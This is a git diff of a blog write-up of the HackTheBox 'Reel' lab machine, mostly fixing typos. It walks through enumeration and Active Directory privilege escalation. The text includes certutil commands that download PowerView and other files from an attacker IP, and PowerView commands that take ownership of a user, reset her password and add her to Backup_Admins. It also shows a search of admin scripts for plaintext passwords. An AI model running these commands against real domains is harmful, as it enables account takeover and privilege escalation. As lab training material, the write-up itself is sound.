@@ -6,6 +6,16 @@ tags:
   - windows
   - hard
   - active-directory
+  - ftp
+  - ismtp
+  - cve-2017-0199
+  - rtf
+  - pscredential
+  - bloodhound
+  - applocker
+  - powerview-ps1
+  - writeowner
+  - writedacl
 ---
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/Reel.png)
 
@@ -36,11 +46,11 @@ Luckily, FTP is misconfigured to accept anonymous logins and there is one direct
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image.png)
 
-Inside documents, there are three files, which we download using `mget` command:
+Inside **documents**, there are three files, which we download using `mget` command:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-1.png)
 
-**readme.txt** seems to be saying that if we email rtf format files, some user will review it. This is definetely something interesting since we have SMTP running on this machine:
+**readme.txt** seems to be saying that if we email **rtf** format files, some user will review it. This is definitely something interesting since we have SMTP running on this machine:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-2.png)
 
@@ -52,7 +62,7 @@ Inside documents, there are three files, which we download using `mget` command:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-4.png)
 
-However, taking a look at **Windows Event Forwarding.docx** using `exiftool`, creator is found to be **nico@megabank.com**, which is very interesting:
+However, taking a look at **Windows Event Forwarding.docx** using `exiftool`, creator is found to be `nico@megabank.com` which is very interesting:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-30.png)
 
@@ -64,7 +74,7 @@ Since we have a potential valid user **nico**, let's verify using SMTP:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-31.png)
 
-`ismtp` verifies user nico is a valid user.
+`ismtp` verifies user **nico** is a valid user.
 
 ## Shell as nico
 ### CVE-2017-0199
@@ -133,15 +143,15 @@ Exploring around the file system as user tome, we found interesting file and a d
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-17.png)
 
-**note.txt** is saying that there aare no AD attack paths from the user to the Domain Admin:
+**note.txt** is saying that there are no AD attack paths from the user to the Domain Admin:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-18.png)
 
-Inside Bloodhound directory, we see `PowerView.ps1` and another directory of Ingestors:
+Inside Bloodhound directory, we see `PowerView.ps1` and another directory of `Ingestors`:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-19.png)
 
-Trying to run `SharpHound.exe` inside the Ingestors directory, we are blocked by the AppLocker:
+Trying to run `SharpHound.exe` inside the `Ingestors` directory, we are blocked by the **AppLocker**:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-20.png)
 
@@ -220,7 +230,7 @@ We will create a list of those default writeable path:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-41.png)
 
-Let's trasnfer it to the target machine:
+Let's transfer it to the target machine:
 
 `certutil.exe -urlcache -f -split http://10.10.1.4.36:8000/icacls.txt`
 
@@ -244,13 +254,13 @@ Following paths were identified to be writeable:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-43.png)
 
-We will use `C:\Windows\Tasks` for it. Let's copt SharpHound.ps1 over to `C:\Windows\Tasks`:
+We will use `C:\Windows\Tasks` for it. Let's copy **SharpHound.ps1 **over to `C:\Windows\Tasks`:
 
 `copy .\SharpHound.ps1 C:\Windows\Tasks`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-48.png)
 
-However, evern after doing all above, we failed to bypass AppLocker. 
+However, even after doing all above, we failed to bypass **AppLocker**. 
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-49.png)
 
@@ -268,7 +278,7 @@ Exploring the file system little more, we discovered **acls.csv** file:
 
 Let's transfer this back at us using SMB server.
 
-Star SMB server on Kali machine:
+Start SMB server on Kali machine:
 
 `impacket-smbserver share .`
 
@@ -294,63 +304,39 @@ This files seems to be result of SharpHound but in CSV format:
 
 With **acls.csv** file, we won't need Bloodhound.
 
-Searching for **tom@htb.local**, we can see information about the user:
+Searching for `tom@htb.local` we can see information about the user:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-27.png)
 
-So tom has WriteOwner rights over claire:
+So tom has **WriteOwner** rights over `claire`:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-28.png)
 
-I’ll see claire has WriteDacl rights over the Backup_Admins group object:
+I’ll see claire has **WriteDacl** rights over the `Backup_Admins` group object:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-29.png)
 
-Finally, we can see that Bac
-
-
-So we will first
 
 ### WriteOwner
 
 Bloodhound Support got a great guide on how to exploit this [here](https://support.bloodhoundenterprise.io/hc/en-us/articles/17312755938203-WriteOwner).
 
-https://jadu101.github.io/Hackthebox%F0%9F%93%A6/Windows%F0%9F%93%98/HTB-Object#writeowner-abuse
+We've already cover exploiting WriteOwner on [HTB-Object](https://jadu101.github.io/Hackthebox%F0%9F%93%A6/Windows%F0%9F%93%98/HTB-Object#writeowner-abuse) before.
 
-To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView.
+To abuse this privilege with **PowerView**’s **Set-DomainObjectOwner**, we will first import **PowerView** into our agent session :
 
-To abuse this privilege with PowerView’s Set-DomainObjectOwner, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as the user with the password reset privilege if you are not running a process as that user.
-
-`certutil.exe -urlcache -split -f http://10.10.14.36:1234/PowerView.ps1`
-
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-51.png)
-
-To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-
-
-$Cred = New-Object System.Management.Automation.PSCredential('htb.local\claire', $SecPassword)
-
-Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as the user with this privilege:
-
-Set-DomainObjectOwner -Credential $Cred -TargetIdentity "Domain Admins" -OwnerIdentity harmj0y
-Now, with ownership of the object, you may modify the DACL of the object however you wish. For more information about that, see the WriteDacl edge section.
-
-Set-DomainObjectOwner -Credential $Cred -Identity "claire" -OwnerIdentity tom
- 
-Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity maria -Rights All -Verbose
- 
-net group "Domain Admins" maria /add
-
-Get-DomainGroupMember -Identity 'Domain Admins'
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-52.png)
 
+Next, we’ll set tom as the owner of claire’s ACL:
+
 `Set-DomainObjectOwner -identity claire -OwnerIdentity tom`
+
+Next, we’ll give tom permissions to change passwords on that ACL:
 
 `Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword`
 
+Now, we’ll create a credential, and then set claire’s password:
 
 ```powershell
 $cred = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -force
@@ -359,24 +345,36 @@ Set-DomainUserPassword -identity claire -accountpassword $cred
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-54.png)
 
+Using the set password, we can ssh in as claire:
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-53.png)
 
 ## Privesc: claire to Backup_Admins
+### WriteDacl
 
-https://jadu101.github.io/Hackthebox%F0%9F%93%A6/Windows%F0%9F%93%98/HTB-Forest#writedacl
+From the csv file before, we know that claire WriteDacl rights on the Backup_Admins group. We can abuse this to add her to the group. We have already covered this on [HTB-Forest](https://jadu101.github.io/Hackthebox%F0%9F%93%A6/Windows%F0%9F%93%98/HTB-Forest#writedacl) before. 
+
+Let's add claire to the backup_admins group:
 
 `net group backup_admins claire /add`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-55.png)
 
-P@ssw0rd123!
+## Privesc: Backup_Admins to Administrator
 
+Although claire is in the backup_admins groups, we still can't read root.txt:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-56.png)
 
+Let's go check out Backup Scripts directory:
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-57.png)
 
+There are couple of scripts in it:
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-58.png)
+
+Let's hunt for keyword "password":
 
 ```powershell
 Get-ChildItem -Recurse "C:\Users\Administrator\Desktop\Backup Scripts" -File | Select-String -Pattern "password" -CaseSensitive:$false
@@ -384,9 +382,15 @@ Get-ChildItem -Recurse "C:\Users\Administrator\Desktop\Backup Scripts" -File | S
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-59.png)
 
-Cr4ckMeIfYouC4n!
+Script found a password in plain text: **Cr4ckMeIfYouC4n!**
+
+Using the password we can ssh in as the administrator:
+
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-60.png)
+
+Now we can read root.txt
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-61.png)
 
 ## References
